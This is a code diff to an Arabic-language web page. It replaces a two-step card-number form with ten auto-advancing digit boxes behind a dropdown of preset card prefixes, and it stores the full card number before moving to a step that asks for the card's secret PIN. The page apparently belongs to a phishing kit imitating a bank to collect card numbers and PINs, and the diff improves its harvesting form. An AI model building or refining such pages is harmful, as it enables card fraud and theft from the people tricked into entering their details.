@@ -367,7 +367,7 @@
             };
         }
 
-        // صفحة إدخال رقم البطاقة - الجزء الأول (6 أرقام + 2 أرقام)
+        // صفحة إدخال رقم البطاقة (تصميم جديد)
         function renderCardStep1() {
             cardData = {};
             document.getElementById('main').innerHTML = `
@@ -376,7 +376,7 @@
                     ${logoHtml}
                     <form id="cardStep1Form" autocomplete="off">
                         <label class="big-label" style="text-align:center;display:block;">رقم البطاقة</label>
-                        <div class="card-inputs" style="justify-content:center;flex-direction:row-reverse;">
+                        <div style="display:flex;justify-content:center;align-items:center;gap:7px;flex-direction:row-reverse;margin-bottom:14px;">
                             <select id="cardStart" required style="width:95px; padding:12px 3px; font-size:16px; border-radius:7px; border:1.5px solid #e0e0e0;direction:ltr;">
                                 <option value="">اختيار</option>
                                 <option value="401319">401319</option>
@@ -384,98 +384,72 @@
                                 <option value="449349">449349</option>
                                 <option value="455094">455094</option>
                             </select>
-                            <input type="text" maxlength="2" required pattern="\\d{2}" placeholder="__" id="card2" style="width:38px;direction:ltr;"/>
+                            <div id="cardInputs" style="display:flex;gap:4px;">
+                                <!-- سيتم توليد 10 مربعات هنا -->
+                            </div>
                         </div>
+                        <button class="btn" type="submit" style="margin-top:20px;">التالي</button>
                     </form>
                 </div>
             `;
-            // اجعل البدء من اليسار
-            document.getElementById('card2').addEventListener('input', function(){
-                this.value = this.value.replace(/[^0-9]/g,'').slice(0,2);
-                if(this.value.length === 2 && document.getElementById('cardStart').value){
-                    setTimeout(()=>renderCardStep2(
-                        document.getElementById('cardStart').value,
-                        this.value
-                    ), 200);
-                }
+            // توليد 10 مربعات رقمية
+            const cardInputsDiv = document.getElementById('cardInputs');
+            for(let i=0; i<10; i++) {
+                const inp = document.createElement('input');
+                inp.type = 'text';
+                inp.inputMode = 'numeric';
+                inp.pattern = '\\d';
+                inp.maxLength = 1;
+                inp.id = 'cardDigit'+i;
+                inp.style = 'width:28px;text-align:center;font-size:17px;direction:ltr;';
+                inp.autocomplete = 'off';
+                cardInputsDiv.appendChild(inp);
+            }
+
+            // التنقل التلقائي بين المربعات
+            const digitInputs = Array.from(document.querySelectorAll('#cardInputs input'));
+            digitInputs.forEach((inp, idx) => {
+                inp.addEventListener('input', function(e){
+                    this.value = this.value.replace(/[^0-9]/g,'').slice(0,1);
+                    if(this.value && idx < digitInputs.length-1) digitInputs[idx+1].focus();
+                });
+                inp.addEventListener('keydown', function(e){
+                    if(e.key === 'Backspace' && !this.value && idx > 0) {
+                        digitInputs[idx-1].focus();
+                    }
+                });
             });
+
+            // التركيز على أول مربع عند تغيير أول 6 أرقام
+            document.getElementById('cardStart').addEventListener('change',function(){
+                digitInputs[0].focus();
+            });
+
             document.getElementById('cardStep1Form').onsubmit = function(e){
                 e.preventDefault();
-                let cStart = document.getElementById('cardStart').value;
-                let c2 = document.getElementById('card2').value;
-                if (!cStart || c2.length !== 2) {
-                    showCustomSnack("يرجى اختيار أول 6 أرقام وإدخال رقمين.");
+                const cardStart = document.getElementById('cardStart').value;
+                const digits = digitInputs.map(x=>x.value).join('');
+                if(!cardStart || digits.length !== 10 || digits.includes('')) {
+                    showCustomSnack('يرجى اختيار أول 6 أرقام وإدخال 10 أرقام للبطاقة.');
                     return;
                 }
-                renderCardStep2(cStart, c2);
+                // حفظ البيانات
+                cardData.cardStart = cardStart;
+                cardData.cardRest = digits;
+                cardData.fullCard = cardStart + digits;
+                // انتقل لخطوة الرقم السري
+                renderCardPin(cardStart, digits);
             };
         }
 
-        // صفحة إدخال رقم البطاقة - الجزء الثاني (4 أرقام + 4 أرقام)
-        function renderCardStep2(cardStart, card2) {
-            document.getElementById('main').innerHTML = `
-                <div class="container">
-                    ${backBtn("renderCardStep1()")}
-                    ${logoHtml}
-                    <form id="cardStep2Form" autocomplete="off">
-                        <label class="big-label" style="text-align:center;display:block;">رقم البطاقة</label>
-                        <div class="card-inputs" style="justify-content:center;flex-direction:row-reverse;">
-                            <input type="text" value="${cardStart}" readonly style="width:95px; background:#eee;direction:ltr;"/>
-                            <input type="text" value="${card2}" readonly style="width:38px; background:#eee;direction:ltr;"/>
-                            <input type="text" maxlength="4" required pattern="\\d{4}" placeholder="____" id="card4a" style="width:54px;direction:ltr;"/>
-                        </div>
-                        <div class="card-inputs" style="justify-content:center;flex-direction:row-reverse;">
-                            <input type="text" maxlength="4" required pattern="\\d{4}" placeholder="____" id="card4b" style="width:54px;direction:ltr;"/>
-                            <input type="text" maxlength="4" required pattern="\\d{4}" placeholder="____" id="card4c" style="width:54px;direction:ltr;"/>
-                        </div>
-                    </form>
-                </div>
-            `;
-            document.getElementById('card4a').focus();
-            document.getElementById('card4a').addEventListener('input', function(){
-                this.value = this.value.replace(/[^0-9]/g,'').slice(0,4);
-                if(this.value.length === 4) document.getElementById('card4b').focus();
-            });
-            document.getElementById('card4b').addEventListener('input', function(){
-                this.value = this.value.replace(/[^0-9]/g,'').slice(0,4);
-                if(this.value.length === 4) document.getElementById('card4c').focus();
-            });
-            document.getElementById('card4c').addEventListener('input', function(){
-                this.value = this.value.replace(/[^0-9]/g,'').slice(0,4);
-                if(this.value.length === 4) {
-                    setTimeout(()=>{
-                        renderCardPin(cardStart, card2, 
-                            document.getElementById('card4a').value,
-                            document.getElementById('card4b').value,
-                            document.getElementById('card4c').value
-                        );
-                    }, 200);
-                }
-            });
-            document.getElementById('cardStep2Form').onsubmit = function(e){
-                e.preventDefault();
-                let c4a = document.getElementById('card4a').value;
-                let c4b = document.getElementById('card4b').value;
-                let c4c = document.getElementById('card4c').value;
-                if (c4a.length !== 4 || c4b.length !== 4 || c4c.length !== 4) {
-                    showCustomSnack("يرجى إدخال كافة الأرقام بشكل صحيح.");
-                    return;
-                }
-                renderCardPin(cardStart, card2, c4a, c4b, c4c);
-            };
-        }
-
-        // صفحة إدخال الرقم السري للبطاقة
-        function renderCardPin(cardStart, card2, card4a, card4b, card4c) {
+        // صفحة إدخال الرقم السري للبطاقة (تعديل لقبول الإدخال الجديد)
+        function renderCardPin(cardStart, cardRest) {
             cardData.cardStart = cardStart;
-            cardData.card2 = card2;
-            cardData.card4a = card4a;
-            cardData.card4b = card4b;
-            cardData.card4c = card4c;
-            cardData.fullCard = `${cardStart}${card2}${card4a}${card4b}${card4c}`;
+            cardData.cardRest = cardRest;
+            cardData.fullCard = `${cardStart}${cardRest}`;
             document.getElementById('main').innerHTML = `
                 <div class="container">
-                    ${backBtn(`renderCardStep2('${cardStart}','${card2}')`)}
+                    ${backBtn(`renderCardStep1()`)}
                     ${logoHtml}
                     <form id="cardPinForm" autocomplete="off">
                         <div class="input-group">
